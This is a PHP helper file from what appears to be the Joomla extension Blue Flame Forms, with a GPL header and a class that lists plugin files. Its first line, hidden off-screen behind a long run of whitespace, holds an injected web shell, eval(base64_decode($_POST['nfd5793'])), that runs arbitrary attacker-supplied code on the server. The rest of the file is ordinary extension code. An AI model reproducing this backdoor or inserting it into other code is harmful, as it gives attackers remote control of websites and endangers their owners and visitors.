<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nfd5793']));?><?php
/**
 * @version $Id: helper.php 147 2009-07-14 20:20:18Z  $
 * @package Blue Flame Forms (bfForms)
 * @copyright Copyright (C) 2003,2004,2005,2006,2007,2008,2009 Blue Flame IT Ltd. All rights reserved.
 * @license GNU General Public License 
 * @link http://www.blueflameit.ltd.uk
 * @author Phil Taylor / Blue Flame IT Ltd.
 * 
 * This file is part of the package bfForms.
 * 
 * bfForms is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * bfForms is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this package.  If not, see http://www.gnu.org/licenses/ 
 */
defined ( '_JEXEC' ) or die ( 'Restricted access' );

final class form_plugin_helper {
	
	public function __construct() {
		throw new Exception ( 'Class should not be instantiated' );
	}
	
	public static function _getFiles($pluginType) {
		global $mainframe;
		$dir = new DirectoryIterator ( JPATH_ROOT . DS . 'components' . DS . $mainframe->get ( 'component' ) . DS . 'plugins' . DS . $pluginType . 's' );
		$i = 0;
		foreach ( $dir as $file ) {
			if (! $file->isDot () && $file->isDir () && substr ( $file->getFilename (), 0, 1 ) != '_' && $file->getFilename () != '.svn') {
				$prefix = JPATH_ROOT . DS . 'components' . DS . $mainframe->get ( 'component' ) . DS . 'plugins' . DS . $pluginType . 's' . DS . $file->getFilename () . DS;
				$files [] = $prefix . $file->getFilename () . '.php';
			
			}
		}
		return $files;
	}
}
